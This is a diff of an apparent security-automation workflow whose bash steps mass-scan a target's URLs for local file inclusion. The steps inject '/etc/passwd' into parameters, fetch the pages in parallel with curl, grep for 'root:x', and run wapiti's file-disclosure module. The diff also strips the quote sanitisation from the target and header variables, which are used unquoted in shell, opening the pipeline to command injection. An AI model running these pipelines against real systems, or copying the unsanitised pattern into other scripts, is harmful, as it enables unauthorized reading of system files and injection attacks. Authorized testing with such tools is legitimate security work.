@@ -10,12 +10,12 @@ steps:
   - name: CustomLFI-External
     command: bash
     script: |
-      gau ${target//\"} | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
+      gau ${target} | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
   - name: CustomLFI-Internal
     command: bash
     script: |
-      httpx -u ${target//\"} | katana -H ${header//\"} qurl | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
+      httpx -u ${target} | katana -H ${header} qurl | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %" || true' 
   - name: AutoLFI
     command: bash
     script: |
-      httpx -u $target -o resLFI_${target//\"}.txt ; wapiti -u "$(cat resLFI_${target//\"}.txt)" -m file -H ${header//\"}
+      httpx -u $target -o resLFI_${target}.txt ; wapiti -u "$(cat resLFI_${target}.txt)" -m file -H ${header}
